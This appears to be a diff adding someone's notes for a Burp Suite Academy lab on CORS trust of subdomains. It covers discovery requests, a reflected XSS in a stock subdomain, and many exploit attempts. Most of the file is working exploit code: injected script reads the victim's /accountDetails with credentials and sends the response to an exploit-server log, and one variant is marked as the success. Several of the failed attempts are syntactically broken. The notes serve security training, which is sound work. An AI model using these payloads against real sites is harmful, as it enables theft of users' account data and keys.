@@ -1,0 +1,132 @@
+#########################################
+#           CORS Vulnerabilities        # 
+#      3nd Lab in Burp Suite Academy    #
+#########################################
+
+
+##########################
+FIND VULN
+##########################
+
+GET /accountDetails HTTP/2
+Host: 0ace00be035f549b81e766b200d7006a.web-security-academy.net
+Origin: https://0ace00be035f549b81e766b200d7006a.web-security-academy.net
+
+and this one
+
+GET /accountDetails HTTP/2
+Host: 0ace00be035f549b81e766b200d7006a.web-security-academy.net
+Origin: https://subdomain.0ace00be035f549b81e766b200d7006a.web-security-academy.net
+
+have one req:
+
+HTTP/2 200 OK
+Access-Control-Allow-Origin: https://bla.0ace00be035f549b81e766b200d7006a.web-security-academy.net
+Access-Control-Allow-Credentials: true
+
+# Find some subdomain
+stock.0ace00be035f549b81e766b200d7006a.web-security-academy.net/?productId=2&storeId=1
+
+can we find maybe some XSS?
+
+########################
+FIND SOME XSS
+########################
+
+
+http://stock.0ace00be035f549b81e766b200d7006a.web-security-academy.net/?productId=2%3Ca+href%3d%22javascript%3aalert(1)%22+onmouseover%3dalert(1)%3EINJECTX+HOVER%3C/a%3E&storeId=1
+
+Req:
+give
+alert('1')
+
+###################
+Let's Exploit
+###################
+
+
+base sploit:
+we do for our situation
+
+<html>
+    <body>
+        <script>
+            document.location="http://stock.0ace00be035f549b81e766b200d7006a.web-security-academy.net/?productId=<script>var req = new XMLHttpRequest();req.onreadystatechange = function(){if (req.readyState == XMLHttpRequest.DONE){fetch('https://exploit-0a6100e2039554608159650b013f0073.exploit-server.net/log?key='%2b req.responseText)};};req.open('GET', 'https://0ace00be035f549b81e766b200d7006a.web-security-academy.net/accountDetails', true); req.withCredentials = true;req.send(null);%3c/script>&storeId=1"
+        </script>
+    </body>
+</html>
+
+and now we need use it in XSS vuln
+<script>document.location="http://stock.0ace00be035f549b81e766b200d7006a.web-security-academy.net/?productId=2<script>var req = new XMLHttpRequest();
+            req.onreadystatechange = function () {
+                if (req.readyState == XMLHttpRequest.DONE){
+                fetch('https://exploit-0a6100e2039554608159650b013f0073.exploit-server.net/log?key=+ req.responseText)
+                }
+            }
+            req.open('GET', 'https://0ace00be035f549b81e766b200d7006a.web-security-academy.net/accountDetails', true);
+            req.withCredentials = true;
+            req.send(null)
+        </script>&storeId=1"
+</script>
+
+<script>document.location="http%3a//stock.0ace00be035f549b81e766b200d7006a.web-security-academy.net/%3fproductId%3d2<script>var+req+%3d+new+XMLHttpRequest()%3b
+++++++++++++req.onreadystatechange+%3d+function+()+{
+++++++++++++++++if+(req.readyState+%3d%3d+XMLHttpRequest.DONE){
+++++++++++++++++fetch('https%3a//exploit-0a6100e2039554608159650b013f0073.exploit-server.net/log%3fkey%3d%2b+req.responseText)
+++++++++++++++++}
+++++++++++++}
+++++++++++++req.open('GET',+'https%3a//0ace00be035f549b81e766b200d7006a.web-security-academy.net/accountDetails',+true)%3b
+++++++++++++req.withCredentials+%3d+true%3b
++req.send(null)
++%3c/script>%26storeId%3d1"</script>
+
+<script>
+document.location="http://stock.0ace00be035f549b81e766b200d7006a.web-security-academy.net/?productId=2<script>var req = new XMLHttpRequest(); req.onreadystatechange = function () { if (req.readyState == XMLHttpRequest.DONE){ fetch('https://exploit-0a6100e2039554608159650b013f0073.exploit-server.net/log?key=req.responseText) } } req.open('GET', 'https://0ace00be035f549b81e766b200d7006a.web-security-academy.net/accountDetails', true); req.withCredentials = true; req.send(null) %3c/script>&storeId=1"
+</script>
+
+document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
+
+<script>
+document.location="http://stock.0ace00be035f549b81e766b200d7006a.web-security-academy.net/?productId=2%3Ca+href%3d%22javascript%3aalert(1)%22+onmouseover%3dalert(1)%3EINJECTX+HOVER%3C/a%3E&storeId=1"
+</script>
+
+NOT worK
+<script>
+document.location="http://stock.0ace00be035f549b81e766b200d7006a.web-security-academy.net/?productId=2%3cscript>var req = new XMLHttpRequest(); req.onreadystatechange = function () {if (req.readyState == XMLHttpRequest.DONE {fetch('https://exploit-0a6100e2039554608159650b013f0073.exploit-server.net/log?key= req.responseText)}} req.open('GET', 'https://0ace00be035f549b81e766b200d7006a.web-security-academy.net/accountDetails', true); req.withCredentials = true; req.send(null) %3c/script>&storeId=1"
+</script>
+
+work:
+<script>
+document.location="http://stock.0ace00be035f549b81e766b200d7006a.web-security-academy.net/?productId=2%3cscript>alert('123') %3c/script>&storeId=1"
+</script>
+
+NOT worK
+<script>
+document.location="http://stock.0ace00be035f549b81e766b200d7006a.web-security-academy.net/?productId=2%3cscript>alert('123'); var req = new XMLHttpRequest(); %3c/script>&storeId=1"
+</script>
+
+NOT worK
+<script>
+document.location="http://stock.0ace00be035f549b81e766b200d7006a.web-security-academy.net/?productId=2<script>var req = new XMLHttpRequest();req.onreadystatechange = function(){if (req.readyState == XMLHttpRequest.DONE){fetch('https://exploit-0a6100e2039554608159650b013f0073.exploit-server.net/log?key='%2b req.responseText)};};req.open('GET', 'https://0ace00be035f549b81e766b200d7006a.web-security-academy.net/accountDetails', true); req.withCredentials = true;req.send(null);%3c/script>&storeId=1"
+</script>
+
+NOT worK
+<script>
+document.location="http://stock.0acc00160302e9468344147b00b5001b.web-security-academy.net/?productId=2<script>var req = new XMLHttpRequest();req.onreadystatechange = function(){if (req.readyState == XMLHttpRequest.DONE){fetch('https://exploit-0a0100600399e97a83d613bf01240009.exploit-server.net/log?key='%2b req.responseText)};};req.open('GET', 'https://0acc00160302e9468344147b00b5001b.web-security-academy.net/accountDetails', true); req.withCredentials = true;req.send(null);%3c/script>&storeId=1"
+</script>
+
+##########################
+##########################
+##########################
+
+
+Success.
+<script>
+    document.location="http://stock.0acc00160302e9468344147b00b5001b.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0acc00160302e9468344147b00b5001b.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0a0100600399e97a83d613bf01240009.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
+</script>
+
+###################
+###################
+END.
+
+
